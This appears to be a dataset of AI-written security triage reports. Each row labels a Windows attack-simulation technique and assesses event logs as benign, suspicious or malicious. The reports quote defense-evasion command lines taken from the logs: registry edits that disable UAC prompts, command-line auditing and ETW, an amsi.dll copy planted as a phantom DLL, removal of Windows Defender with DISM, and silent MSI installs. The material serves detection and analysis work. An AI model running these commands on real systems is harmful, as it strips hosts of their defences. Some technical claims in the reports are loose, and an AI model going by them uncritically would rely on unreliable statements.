### Resolution: SUSPICIOUS

**Guidance on how to proceed:**
- Conduct a more thorough investigation into the source of the time changes. Verify if there are legitimate maintenance or administrative tasks that could justify this behavior.
- Analyze change history and access logs for the account `SERVER002\admin_test` to know if these PowerShell scripts and utilities were executed for benign purposes by an authorized user.
- Review the content of the `AppData\Local\Comms\Unistore\data` and associated logs to confirm or rule out data exfiltration attempts.
- Validate the legitimacy of the Microsoft Edge Update executions by cross-referencing them with known update schedules or configurations.
- Consider isolating Server002 if immediate threats are suspected and conduct a deeper forensic investigation."
Rundll32 execute command via FileProtocolHandler,"After reviewing the provided log entries, here is a detailed analysis of the logs with a focus on identifying any suspicious behaviors or indicators of compromise:

1. **System Log**:
   - The logs indicate several events related to time changes initiated by `svchost.exe`. These timestamps suggest synchronization with an external time source (`time.windows.com`). Such activities typically indicate time synchronization, which is regular for system services. No anomalies or indications of malicious activity are detected here.

2. **Security Log**:
   - Events related to time changes are logged, related to the `svchost.exe` process under the `LOCAL SERVICE` account. The logs do not suggest any privilege escalation or malicious activities. The modification of system time itself, in conjunction with the above system log, aligns with standard time synchronization processes.

3. **Sysmon Log**:
   - There are consistent entries for `MicrosoftEdgeUpdateComRegisterShell64.exe`, which appear to be legitimate Microsoft Edge update processes.
   - However, there is a suspicious command-line event related to `cmd.exe` executing a command: `""cmd.exe"" /c rundll32.exe url.dll,FileProtocolHandler calc.exe`.
     - This command-line activity is usually suspicious as it tries to invoke the Windows Calculator via `rundll32.exe`, a common LOLBin (Living Off the Land Binary) technique. Though ""calc.exe"" is a benign application, the method of execution suggests potential misuse or an attempt to execute arbitrary code, especially when running from a temporary directory.

4. **Application Log**:
   - The application log contains a benign entry indicating that a service related to edge updates has stopped. This aligns with the regular update process as seen in other logs.

Considering these observations, here’s the final assessment:

- **BENIGN**: The majority of events like time synchronization and system service operations are standard and show no evidence of compromise.
- **SUSPICIOUS**: The use of `cmd.exe` followed by `rundll32.exe` to launch `calc.exe` should be considered suspicious. This activity warrants further investigation to rule out misuse or malicious intent.
- **MALICIOUS**: No conclusive evidence categorizes the observed activities as malicious; however, the suspicious command line activity should be treated with caution.

**Resolution**: **SUSPICIOUS**

**Recommendations**:
- Conduct deeper investigation into the origin and context of the suspicious command line activity.
- Review account activities and correlate with user behavior to ascertain intent.
- Monitor any subsequent or similar activities, particularly those involving `rundll32.exe` or similar LOLBins.
- Implement additional monitoring for deviations from expected command-line patterns to identify potentially malicious behaviors."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Based on the analysis of the provided event logs, there are several points of concern indicating potentially suspicious activities:

### Suspicious Activities:
1. **Unusual Powershell Execution**: The Windows PowerShell log shows a Powershell instance initiated with the command:
   ```
   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -Command Write-Host VBScript executed me!; exit
   ```
   - The use of `-nop` (no profile) is commonly associated with obfuscation tactics to avoid detection, which might indicate malicious intent.
   - The script mentions VBScript execution, potentially pointing to a script-based attack vector.

2. **Command Execution and Installation via MSI**: The `cmd.exe` was executed with a command line to install an MSI package:
   ```
   cmd.exe /c c:\windows\system32\msiexec.exe /q /i ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_VBScript.msi""
   ```
   - The execution of MSI files located in temporary directories, especially with quiet (`/q`) installation flags, can be indicative of software being installed without user interaction, often used in malware deployment mechanisms.
   - The name `data.007_VBScript.msi` is unconventional for typical software installers and hints at possibly being part of a script-based attack.

3. **Time Change Activity**: The Security and System logs indicate a time change on `svchost.exe`:
   - Event ID 4616 in the Security log and Event ID 1 in the System logs show a previous time adjustment on the system. Time manipulation may be used to hide logs or alter timestamps for activities such as evading forensic analysis.

4. **Sysmon Observations**: Multiple legitimate Windows utilities like `whoami.exe`, `conhost.exe`, `hostname.exe`, and `wevtutil.exe` being executed are not inherently abnormal, but their context in the timeline matching other PowerShell and CMDEXE invocations could potentially indicate process chaining typical in malicious activity.

### Assessment:
The logs demonstrate several classic indicators of potentially suspicious and malicious activities, particularly in the manipulation of system time, script execution via Powershell with potentially hazardous flags, unusual MSI installer execution, and observed patterns of process execution.

### Resolution: SUSPICIOUS
The logs do not provide conclusive evidence of a specific, definitive malicious activity but contain strong indicators of potentially suspicious activities that warrant further investigation.

### Recommendations for Further Action:
1. **Conduct Detailed Forensic Analysis**: Review the contents and origin of the MSI package `data.007_VBScript.msi` to determine its legitimacy.
2. **Review Powershell History and Script Files**: Identify any scripts that may have been executed to ascertain intent and potential malicious payloads.
3. **Correlate with Network Traffic**: If logs of corresponding network traffic are available, review them to check for any unusual outbound connections around the time of the detected activities.
4. **User Activity and Audit Trails**: Check for anomalies or unexplained actions by the user `SERVER002\admin_test` to evaluate if credentials could be compromised.
5. **Monitor and Log for Recurrences**: Set up alerts for similar patterns of execution involving unusual PowerShell commands or MSI executions in temporary directories."
Disable ConsentPromptBehaviorAdmin via registry keys,"Based on the analysis of the provided logs, several key observations can be made regarding the activities on the host:

1. **Frequent Use of `wevtutil.exe`**:
   The logs indicate multiple instances of `wevtutil.exe` being executed by the `SERVER002\admin_test` user. This tool is commonly used for managing event logs and could indicate suspicious behavior if not aligned with regular administrative tasks.

2. **Command Line for Deactivating UAC Prompts**:
   There is a significant entry where `cmd.exe` is executed with a command to modify the registry settings:
   ```
   ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
   ```
   This command disables the User Account Control (UAC) prompt for administrative accounts, a common tactic used in privilege escalation or to facilitate lateral movement without user consent.

3. **Uncommon Process Execution**:
   The frequent use of `conhost.exe` alongside legitimate system processes like `wevtutil.exe` and `hostname.exe` indicates typical process execution handling; however, the context and the absence of accompanying tasks suggest a deeper investigation might be warranted into the purpose of these executions.

4. **Privilege Levels and Logon Events**:
   There are multiple high-integrity level executions with `SERVER002\admin_test` holding several privileges typically associated with administrative users, like `SeDebugPrivilege`. While not uncommon for an admin user, if misused, could point to credential or privilege misuse.

5. **Usage of `whoami.exe` and `hostname.exe`**:
   The execution of `whoami.exe` and `hostname.exe` suggests potential reconnaissance activity, although these alone are not inherently malicious unless correlated with other suspicious actions.

6. **Network Connectivity Confirmation**:
   Logon events and network activity from external IPs using NTLM authentication indicate potential remote access which is a critical point for investigation. The usage of addresses like `fe80::e3b5:5371:12a8:9c77` should be cross-checked for external access patterns.

### Assessment
- **SUSPICIOUS**: The alteration of UAC settings via a registry modification and the multiple executions of `wevtutil.exe` without clear context, combined with the presence of NTLM authentication from what might be remote IPs, warrants further investigation.
  
### Recommended Actions
1. **Verify Administrative Actions**: Confirm if these actions were part of regular maintenance or administrative tasks. Validate with the IT team or administrative logs.
2. **Inspect User Account Activity**: Review all recent actions and logons for `admin_test` across systems to assess whether there is a pattern of unauthorized access.
3. **Scan for Extended Threats**: Use endpoint detection and response (EDR) tools to scan the machine for potential indicators of compromise (IoCs).
4. **Network Inspection**: Investigate any unusual incoming/outgoing connections, particularly those involving NTLM authentications.
5. **Review UAC and Policy Changes**: Double-check current registry values and revert any unauthorized changes to the UAC settings to maintain security integrity.

A follow-up investigation is suggested to establish the context around these activities to rule out or confirm malicious intent."
Disable Windows Command Line Auditing using reg.exe,"### Analysis of the Logs:

1. **Security Log Analysis:**
    - The security logs indicate activity related to time synchronization (`EventID 4616`) by the `svchost.exe` process under `LOCAL SERVICE` (S-1-5-19) on `Server002`. The time change activities recorded are system-oriented and typically benign, as they are related to standard time synchronization activities.

2. **Sysmon Log Analysis:**
    - There is extensive activity logged concerning the execution of several processes by the user `SERVER002\admin_test`:
        - Execution of `wevtutil.exe` and `conhost.exe` multiple times, which is common for system administration and IT processes to view event logs or perform administrative tasks. The user is `admin_test`, indicating administrative-level actions.
        - `hostname.exe` and `whoami.exe` are also executed. These commands show system and user information, respectively. These could be part of routine system checks but should be investigated further if there's no known reason for their usage.
        - A notable execution is the command `cmd.exe /c reg add ...`. This command modifies registry settings by adding a specific key, disabling the ability to store command-line arguments in audit logs. This is unusual and suspicious because it seems an attempt to modify audit settings, potentially to avoid detection for subsequent activities.
        - The frequent launching of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) is common during update cycles. Their execution under `NT AUTHORITY\SYSTEM` indicates update tasks running at a high integrity level, related to maintenance routines.

3. **Application Log Analysis:**
   - Entries from `edgeupdate` show standard service stop events. They appear aligned with typical termination events of update services once tasks are completed.

4. **System Log Analysis:**
   - Time synchronization events are logged as part of routine NTP updates (`EventID 35`). Observations about time changes (`EventID 1, 24`) mirror the handling of minor corrections typical with time synchronization over networks.

### Assessment:
- **Benign Activities**: Time synchronization, frequent `wevtutil.exe` and `conhost.exe`, and Microsoft Edge updates.
- **Suspicious Activity**: The use of `cmd.exe /c reg add` to modify audit policies potentially indicates an attempt to obfuscate malicious activities by manipulating registry settings to disable the capture of command lines in audit logs. This activity by the `admin_test` user requires further scrutiny.

### Recommended Resolution:
**SUSPICIOUS** - The logs show suspicious activity that warrants further investigation, specifically the registry modification through `cmd.exe`. It is essential to verify if this was intended as part of a legitimate task by the admin or a potential red flag for preparatory actions preceding more malicious activity. Investigate any recent administrative IT tasks or scan the system for additional signs of compromise."
Msiexec.exe - Execute Local MSI file with embedded JScript,"Upon reviewing the provided logs, a detailed chronological analysis indicates potential suspicious behavior that warrants further investigation. Here's the breakdown:

### Investigation Findings:

1. **Sysmon Log Analysis:**
    - **Powershell Execution:** The logs indicate the execution of `PowerShell.exe` by the user `SERVER002\admin_test` with high frequency and from a high integrity level. Powershell usage is commonly exploited for malicious activities, particularly if it is used in combination with obfuscation or downloading scripts.
    - **wevtutil and conhost Executions:** Repeated executions of `wevtutil.exe` and `conhost.exe` are observed. `wevtutil.exe` is a legitimate tool used to manage windows event logs but can be abused to clear logs which attackers often do to cover their tracks. 
    - **HOSTNAME and WHOAMI Executions:** These are not uncommon processes (As `hostname.exe` is used to get the local computer’s host name and `whoami.exe` to display current username), but frequent execution, especially followed by potential obfuscation with powershell or combined with other suspicious activity, could indicate reconnaissance efforts by an attacker.
    - **CMD and MSIEXEC Execution:** More concerning, however, is the execution of `cmd.exe` with the command line to silently install an MSI package (`data.007_JScript.msi`). Silent installation (`/q` switch) without user interaction, particularly from the Temp directory, is often associated with malware installation.
  
2. **Application Log Analysis:**
    - **MsiInstaller Entries:** Logs show installation events for `data.007_JScript.msi`, which seems to correspond with msiexec's execution. Install events in the Temp folder with JScript in the filename can hint at malicious scripting attempts for persistence or remote access.
   
3. **Security Concerns:**
    - **Potential Malware Installation:** The silent installation of MSI from Temp suggests potential malware deployment. The `.007` JScript MSI name and path under Temp directory imply obfuscation and non-standard software distribution.
    - **Reconnaissance Indicators:** The combination of process executions (hostname, whoami) with other indicative actions may suggest reconnaissance phase activities where an attacker tries to gather information about the network and system setup.

### Resolution:
- **SUSPICIOUS:** The activities observed are suspicious and require further investigation to confirm whether the actions were legitimate or part of malicious behavior. Given the high integrity level execution, repeated use of wevtutil and obscure MSI installation in combination with reconnaissance-related process events, it raises red flags.

### Recommended Actions:
1. **Immediate Investigation:**
    - Ascertain the legitimacy of the `data.007_JScript.msi` installation.
    - Review Powershell logs or commands for potential misuse or indicators of compromise.
    - Check user account `SERVER002\admin_test` access logs and permissions for unusual patterns.
    - Conduct a detailed review of system changes around this time to ascertain if additional backdoors or tools have been deployed.

2. **Forensic Analysis:**
    - Investigate file hashes and match against known threat databases.
    - Analyze network traffic logs to identify any communication with external entities.

3. **Preventive Measures:**
    - Develop YARA rules or other IDS setups to detect similar MSI patterns.
    - Enforce stricter monitoring and logging of commands that initiate from Temp folders.

The outcome of these investigations should determine further actions, including incident response escalation."
Phantom Dll Hijacking - WinAppXRT.dll,"After analyzing the provided Windows event logs, I have identified several key observations:

1. **Microsoft Edge Update**: There are several instances of MicrosoftEdgeUpdate.exe being executed by the `NT AUTHORITY\SYSTEM` user (Sysmon Event IDs 5 and 1). This is normal behavior as Microsoft Edge frequently checks for and applies updates automatically.

2. **whoami Execution**: The `whoami.exe` command, which is a legitimate Windows utility used to display user information, was executed by the user `SERVER002\admin_test`. The use of this command alone is not inherently suspicious, but it could indicate someone gathering information about the system environment if it’s unexpected or occurs frequently.

3. **wevtutil and conhost Executions**: The `wevtutil` command is used for managing Windows event logs, and the `conhost.exe` is the Console Window Host. Both were executed multiple times by the user `SERVER002\admin_test`. Frequent or unusual usage of these might warrant further attention, but there's no direct evidence of malicious activity from these logs alone.

4. **Suspicious cmd.exe Execution**: There is an instance where `cmd.exe` is executed with a suspicious command line:
   - `""cmd.exe"" /c copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll & ren %APPDATA%\amsi.dll WinAppXRT.dll & copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll & reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f`
   
   This command sequence suggests an attempt to manipulate system files and environmental variables, likely to bypass or disable security checks like AMSI (Antimalware Scan Interface). Such behavior is indicative of malicious intent.

5. **Registry Modification**: The use of `reg.exe` to modify registry values in conjunction with the above `cmd.exe` script is an additional red flag. This activity indicates a possible attempt to establish persistence or evade security mechanisms.

Based on these observations, particularly the suspicious command-line actions involving system file manipulations and registry edits, the logs indicate a probability of active malicious activity on the host.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected host to prevent further compromise.
- Conduct a thorough investigation of user `SERVER002\admin_test` activities, including reviewing login times and address any unauthorized access.
- Perform a full malware scan on the affected host.
- Review and monitor other hosts in the network for similar activities.
- Consider resetting credentials for `admin_test` and analyze other accounts for potential compromise.
- Review and restore any altered system files or configurations.
"
Disable .NET Event Tracing for Windows Via Registry (cmd),"Upon analyzing the provided logs, several entries and patterns are notable. Below is a breakdown of the analysis:

### Anomalous Behavior:

1. **Frequent Execution of Sysinternals Tools:**
   - The `wevtutil.exe` (Event Viewer Command Line Utility) appears multiple times in the logs. This utility is used to enable and access event logs; an excessive number of invocations, especially within a short time frame, could suggest log tampering or data exfiltration attempts.

2. **Registry Manipulation:**
   - There is an entry showing `cmd.exe` invoking `reg.exe` to add or modify a registry key at `HKLM\Software\Microsoft\.NETFramework`. The command `/v ETWEnabled /t REG_DWORD /d 0` suggests disabling ETW (Event Tracing for Windows), which is a known technique to evade detection by interfering with event logging.

3. **Elevation and Command Execution Context:**
   - Several of these processes are executed with a high integrity level by the user `SERVER002\admin_test`. Even though this account uses administrative privileges, the nature and the sequence of these operations might indicate suspicious activity.

4. **Microsoft Edge Update Executions:**
   - The frequent activity involving Microsoft Edge Update executables (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, and `MicrosoftEdgeUpdateComRegisterShell64.exe`) can be typical, but the presence in a temporary directory such as `C:\Program Files (x86)\Microsoft\Temp\` might indicate something unusual if it isn't standard for the setup.
   - The updates and installations appear legitimate, as the software and file version information matches the expected details from Microsoft.

5. **Execution of Whoami and Hostname Commands:**
   - Tools like `whoami.exe` and `HOSTNAME.EXE` are executed. While common for admin diagnostics, their execution alongside other potentially suspicious activities raises some concerns.

### Assessment:

- **Suspicious Patterns:** The combination of registry changes, specifically targeting ETW, along with frequent executions of administrative utilities, suggests there might be an attempt to cover tracks or disable security monitoring controls.
  
- **Potential Indicators of Compromise:** The focus on registry changes related to diagnostics and logging could indicate malicious intent, especially when conducted without clear justification.

### Resolution:

- **Resolution:** SUSPICIOUS

### Guidance and Next Steps:

1. **Review Recent Changes and Sessions:**
   - Investigate why the `admin_test` user account was making these changes. Review Active Directory logs for unusual login patterns or privilege escalations.

2. **Inspect Modified Registry:**
   - Verify the legitimacy of changes to the registry and confirm with the IT team if these modifications align with any ongoing troubleshooting or configurations.

3. **Conduct a System Integrity Check:**
   - Use tools to ensure that system integrity has not been compromised, focusing on Sysinternals tools and any other system monitoring services.

4. **Network Traffic Analysis:**
   - Conduct a network traffic analysis to check for any unusual exfiltration attempts or connections, especially around the timestamps of the suspicious events.

5. **Enhanced Monitoring:**
   - Enable tighter monitoring on administrative tools and conduct full endpoint scanning for malware or unauthorized software installations.

6. **User Education and Process Review:**
   - Reaffirm user education on the use of admin accounts and revise internal processes and monitoring to effectively track this behavior in real-time. 

By following these steps, it will help determine whether this activity results in a benign outcome or if further investigations indicate malicious intent."
Windows HideSCAHealth Group Policy Feature,"### Detailed Analysis

#### Suspicious or Anomalous Behavior

1. **Repeated Execution of Microsoft Edge Update:**
   - Numerous log entries indicate repeated execution of Microsoft Edge Update-related processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, etc.). While update operations are generally benign, the frequency and variety of command line options merit closer inspection, especially the usage of `\\Temp\\` directories.

2. **Modification of System Registry:**
   - There is an event where `cmd.exe` was used to launch `reg.exe` to modify a registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` with `HideSCAHealth`. The command-line argument includes the `/f` flag to force the addition. This action might be associated with an attempt to hide certain system elements or potential persistence mechanism.

3. **Use of Admin Privileges:**
   - Most of these processes are running with high integrity levels or as System, which means they are operating with elevated privileges. This is not inherently malicious but coupled with registry changes and repeated process execution, it poses potential risks.

#### Indicators of Malicious Activity or Compromise

- **Registry Manipulation:**
  Modifying registry entries without clear justification, especially with directives to force changes, is often a tactic used by malware to avoid detection or maintain persistence.

- **Use of `wevtutil.exe`:**
  This utility, when misused, can be involved in the cleaning of event logs to hide malicious activity. Multiple instances were observed, suggesting a potential for log tampering.

#### Assessment and Conclusion

Based on the logs provided, there are several activities that go beyond normal software update behavior and standard system operations. The modification of the registry without any obvious justification and consistent use of high privilege level executions suggest cautious investigation is necessary. However, without definitive evidence pointing to malware or explicit malicious behavior, the activities noted are **SUSPICIOUS** and not confirmed as explicitly malicious at this point. 

### Resolution

**SUSPICIOUS**

### Recommendations

1. **Further Investigation:**
   - Investigate the purpose and origin of the command modifying the registry. Validate if it is related to legitimate IT operations or part of a script intended by authorized personnel.
   - Conduct an integrity check on `MicrosoftEdgeUpdate.exe` and other related executables to ensure they are not tampered.

2. **Review IT Policies:**
   - Verify if the activities involving high privilege processes align with IT policy changes or system updates recently authorized. 

3. **Enhanced Monitoring:**
   - Increase monitoring of the host for any additional unusual activities. Pay close attention to any network communications initiated by these processes.

4. **Engage with Incident Response:**
   - Prepare for possible incident response activities, including forensic analysis and system restoration, should further suspicious activity be observed.

5. **Consult Threat Intelligence:**
   - Cross-reference behaviors with known indicators of compromise (IoCs) for recent threats involving similar tactics and techniques."
InstallHelper method call,"Upon careful inspection of the provided event logs, several indicators suggest suspicious and potentially malicious activities:

1. **Unusual PowerShell Activity**:
   - The PowerShell logs show that a script (`InstallUtilTestHarness.ps1`) is being run from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\`). This script uses `Invoke-BuildAndInvokeInstallUtilAssembly` and includes assembly manipulation using `System.Configuration.Install`. This behavior is atypical for regular operations and may indicate an attempt to execute an assembly with administrative privileges, potentially bypassing security restrictions.

2. **Execution of .NET Framework Tools**:
   - The `csc.exe` (C# compiler) and `cvtres.exe` (Microsoft Resource File To COFF Object Conversion Utility) are executed from a temporary directory (`C:\\Users\\admin_test\\AppData\\Local\\Temp\\`). The use of these tools in conjunction with the PowerShell script suggests the compilation and execution of custom or potentially harmful code directly on the device.

3. **Elevation of Privileges**:
   - The processes are running under a high integrity level with the user `SERVER002\admin_test`, suggesting that the actions are executed with elevated privileges. Such operations would typically be unnecessary for routine administrative tasks, particularly given their location within a temporary directory.

4. **Command Line Anomalies**:
   - There are several instances where command lines involve `/logfile= /logtoconsole=false` arguments, potentially utilized to suppress logging details, another red flag in potentially malicious activities.

5. **Edge Update Processes**:
   - A series of Edge update processes and installations are recorded, such as `MicrosoftEdgeUpdate.exe`, running with SYSTEM privileges. While this may appear regular, its inactivity followed by immediate reactivation alongside PowerShell activities suggests it may be leveraged as part of a larger attack vector, perhaps by exploiting update processes for unauthorized activities.

Based on these findings, the ongoing events seem consistent with potential malicious behavior, especially concerning the use of PowerShell and .NET tools. Immediate containment and further investigation are warranted to assess whether the execution resulted in modifications or additional nefarious actions elsewhere in the system.

**Resolution**: SUSPICIOUS  

**Guidance**:
- Conduct a deep forensic analysis on `Server002`, focusing on the PowerShell script's origin and any changes it might have implemented.
- Disable network connectivity of the host temporarily to prevent any potential spread or exfiltration of data.
- Review security policies and tighten controls around PowerShell execution policies and logging.
- Consider a thorough AV/malware scan and check for indicators of compromise (IOCs) in other related systems.
- Audit user `admin_test`'s permissions and review recent activity for anomaly detection."
BlackByte Ransomware Registry Changes - Powershell,"Upon reviewing the provided Windows event logs, the following points were identified:

### Notable Observations:
1. **Process Execution**: 
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are observed, which in isolation are typical system utilities but are executed frequently within the same time frame under the same user: `SERVER002\admin_test`.
   - The `wevtutil.exe` tool is used for managing event logs, and frequent execution may indicate attempts to manipulate or clear logs. This can be a sign of malicious activity if an attacker tries to cover tracks.

2. **PowerShell Command Usage**: 
   - A PowerShell script was executed to modify registry keys such as `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`. This script appears to modify system policies, which might indicate privilege escalation or persistence attempts if done without proper authorization.
   - The presence of these PowerShell commands in the logs is concerning as they are associated with attempts to enable remote connections or bypass UAC restrictions.

3. **Process Integrity Level**:
   - Processes are running with a high integrity level. This is typical for administrative commands but should be investigated to ensure the actions were legitimate.

4. **Whoami and Hostname Executions**:
   - `whoami.exe` was executed, which can be used to gain information about the currently logged-in user and their privileges. This is not inherently malicious by itself but could be used in reconnaissance before further actions.

5. **Security and System Logs**:
   - The logs show time synchronization events indicating the time was adjusted. This is not strictly malicious, but any unscheduled changes should be verified with legitimate administrative actions.

6. **Network Services**:
   - Processes like `svchost.exe` and `WmiPrvSE.exe` running under `NT AUTHORITY\SYSTEM` indicate standard background services. These do not raise immediate concerns within provided context.

### Assessment:
- **Suspicious Activity**: The combination of frequent executions of `wevtutil.exe`, PowerShell executions modifying critical registry keys, and querying tools like `whoami.exe` in rapid succession are indicative of potentially unauthorized or malicious actions.

### Guidance on Proceeding:
1. **Review Account Logins**: Verify the intentions of the `SERVER002\admin_test` user. Determine if this user performed these actions or if the account was compromised.
2. **Check for Unauthorized Scripts**: Investigate if there are unauthorized scripts present or recent changes to the system that align with privilege escalation tactics.
3. **Verify Logs Integrity**: Inspect the integrity and completeness of system logs to confirm no tampering or deletions.
4. **Conduct Endpoint Security Check**: Perform a thorough endpoint security assessment and malware scan to rule out breaches.

Based on the above observations, this case qualifies as **SUSPICIOUS**. The logs show activities that warrant further investigation to ensure no malicious activities are ongoing."
Disable Windows Defender with DISM,"Upon analyzing the provided Windows event logs, several observations and potential indicators of activity warrant attention:

### Notable Observations:
1. **Disabling Windows Defender**: 
    - The Sysmon logs show the execution of a command that disables Windows Defender using `Dism.exe`:
      ```plaintext
      CommandLine: ""cmd.exe"" /c Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
      ```
    - This operation was carried out by the user ""SERVER002\\admin_test"" with a high integrity level. Disabling security features without proper reason could indicate malicious intent.

2. **Time Change Events**:
    - There are multiple entries related to the change of system time. These changes were executed by the process `svchost.exe`:
      ```plaintext
      PreviousTime: 2024-10-28 09:06:18.6113958
      NewTime: 2024-10-28 09:06:15.8313236
      ```
    - These adjustments can be suspicious, as attackers sometimes modify system time to avoid detection or facilitate attacks.

3. **Use of `wevtutil.exe`**:
    - Multiple instances of `wevtutil.exe` are executed by ""SERVER002\\admin_test"". This utility is often used to manage Windows Event logs, including clearing them, which could be used to cover tracks in a malicious activity.

4. **Elevated Privileges**:
    - The user ""admin_test"" has numerous high-level privileges, including `SeDebugPrivilege`, which is typically unnecessary for ordinary administrative activities and could be exploited for malicious purposes.

5. **Activities Involving `cmd.exe`, `whoami.exe`, and other utilities**:
    - The use of basic utilities like `whoami.exe` and `hostname.exe` may seem normal but, in combination with other activities noted above, could be indicative of someone executing reconnaissance commands.
    - The sequence and combination of commands are unusual but not definitively malicious without additional context.

6. **Edge Update Execution**:
    - Multiple processes related to Microsoft Edge Update are reported. However, they appear to be legitimate update activities by `MicrosoftEdgeUpdate.exe` and associated components conducted by `NT AUTHORITY\\SYSTEM`.

### Assessment:
Based on the above findings, the most concerning activities are the disabling of Windows Defender and the time change events. The disabling of security features, especially in an automated, quiet manner, is typically an indicator of malicious intent. The change of system time is suspicious, possibly indicating an attempt to compromise log integrity or disguise activities. The high level of privileges and use of system utilities further raises suspicion.

### Resolution: SUSPICIOUS
The log entries suggest potentially suspicious behavior, particularly concerning the disabled security features and time changes. While this activity doesn't confirm outright maliciousness, it indeed warrants further investigation. It may be part of a legitimate administrative task, albeit suspiciously executed.

### Recommended Actions:
- **Further Investigation**: Verify if there was any scheduled or planned maintenance or administrative activity that matches this behavior.
- **Security Audit**: Conduct a security audit on user ""admin_test"" to identify any unauthorized access or actions.
- **Monitor for Additional Indicators**: Continue monitoring for additional suspicious activities or attempts to further alter system configurations.
- **Review Change Management Logs**: Check if any official records justify the behavior detected, especially concerning security feature configurations."
Dynamic C# Compile,"Upon reviewing the presented logs, a few activities stand out, potentially indicating malicious behavior. Below is a breakdown of the critical findings:

1. **Suspicious PowerShell Usage:**
   - A PowerShell command was executed with the following command line:
     ```
     ""powershell.exe"" & {Invoke-Expression \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\data.004_DynamicCompile.exe\""}
     ```
   - The use of `Invoke-Expression` within PowerShell is often associated with malicious behavior as it allows execution of arbitrary expressions, which can include obfuscated malware.
   - The execution from a temporary directory adds to the suspicion, suggesting a possible payload dropped for execution.

2. **Process Execution Sequence:**
   - The Sysmon logs show the execution of several system utilities including PowerShell, conhost.exe, wevtutil.exe, and whoami.exe. While these are standard Windows utilities, their simultaneous usage without typical administrative or IT operations context can indicate malicious use.
   - Usage of `whoami.exe` might suggest an attempt to verify privileges on the system, which is common post-compromise behavior.

3. **Anomalous File Execution:**
   - The execution of `data.004_DynamicCompile.exe` from a temporary directory via PowerShell is particularly suspicious as it is not a standard Windows executable or a usual software application typically executed in an enterprise environment.
   - This anomaly suggests it could be a dynamically compiled binary intended for malicious purposes.

4. **System and Application Logs:**
   - Regular system updates and Windows Defender activities are documented. However, alongside the suspicious PowerShell command execution, it implies that there might have been an attempt to capitalize on system activities as camouflage for malicious actions.

5. **Windows Update Related Activity:**
   - Presence of wuauclt.exe process (Windows Update Client) in the logs is normal during system updates. However, the timing in relation to other potentially malicious activities could indicate a deeper evaluation is required.

**Assessment:**
Given the evidence presented in the logs:
- The combination of `Invoke-Expression` in PowerShell, the location and nature of executed files, and typical indicators of post-exploitation activity like privilege detections (`whoami.exe`) strongly suggest malicious intent.

**Resolution: MALICIOUS**
These logs contain evidence that points towards potential malicious activity within the system. Immediate follow-up actions should be taken:

1. **Containment:**
   - Immediately isolate `Server002` from the network to prevent any further potential spread or communication with command and control servers.

2. **Investigation:**
   - Conduct a forensic analysis of `Server002`, focusing on executed files, command-line arguments, and network connections during the period of the logs.
   - Retrieve and analyze any scripts or executables in the specified temporary directory.

3. **Remediation:**
   - Ensure the system is fully patched and up to date.
   - Implement stricter PowerShell execution policies and monitor similar command lines in the network.

4. **Monitoring:**
   - Set up continuous monitoring with alerting on similar activities to prevent future incidents. 

These actions will help mitigate the risk of further compromise and ensure that the threat is fully understood and neutralized."
Certutil Rename and Decode,"Upon analyzing the provided event logs, several notable details stand out that merit a closer examination:

### Key Observations:

1. **Security Log (Winlogon and Privilege Events)**
    - **Event ID 4624**: This event indicates a successful logon as SYSTEM via the Advapi process, which is normal for service accounts and may not be inherently suspicious.
    - **Event ID 4672**: The logging of special privileges such as `SeDebugPrivilege` granted to the SYSTEM user is typical in server environments for system processes. However, these privileges alone can be worrisome if not expected or monitored closely for unwanted usage.

2. **Sysmon Log (Process Creation and Linking)**
    - Multiple events showing command-line usage involving Windows binaries such as `wevtutil.exe`, `cmd.exe`, `certutil.exe`, and `whoami.exe` executed by an account named `SERVER002\\admin_test`:
        - **Cmd.exe Usage** with the command `cmd.exe /c copy %%windir%%\\system32\\certutil.exe %%temp%%\\tcm.tmp &amp; ...` indicates a potentially malicious operation, particularly using `certutil.exe` to encode and decode files. This is a common technique used by attackers to masquerade or transform files for execution.
        - Execution of `certutil.exe` is typically used in administrative tasks, but the creation of temporary files with encoded content suggests possible obfuscation attempts and warrants deeper inquiry.

3. **Anomalous Process Patterns**
    - Frequent consecutive launches of `wevtutil.exe` and `conhost.exe` under `SERVER002\\admin_test` within the Sysmon logs could indicate potential attempts at event log manipulation or other administrative tasks performed at an unusually high frequency.

4. **Time Discrepancies and Updates**
    - Kernel and System logs show timestamp changes. While minor, these could align with system time adjustments potentially related to synchronization or potentially as part of an intrusion to disguise the timeline of activities.

### Assessment:

- **Indicators of Potential Malicious Activity**: The execution of commands utilizing tools such as `certutil.exe` for file manipulation raises suspicion. Such behavior is typical of file and payload obfuscation methods used in stealthy attacks. 
- **Anomalous Administrative Tasking**: Elevated usage of tools like `wevtutil.exe` and frequent process creations could point towards administrative tasks. When combined with the usage of utility commands for modifying or interacting with system files, they could point towards potential malicious configurations or preparations.

### Recommendation:

Given this analysis recommends a resolution of **SUSPICIOUS**:

- Conduct a thorough investigation into the user `SERVER002\\admin_test` to verify if these actions are legitimate or warrant concern. 
- Review any corresponding network logs and external connections during this observed period to check for data exfiltration.
- Monitor related processes for persistence mechanisms and ensure endpoint protection measures are functioning optimally.
- Engage threat hunting teams to inspect for more hidden adversarial activity, scrutinizing for additional artifacts left by potential attackers.

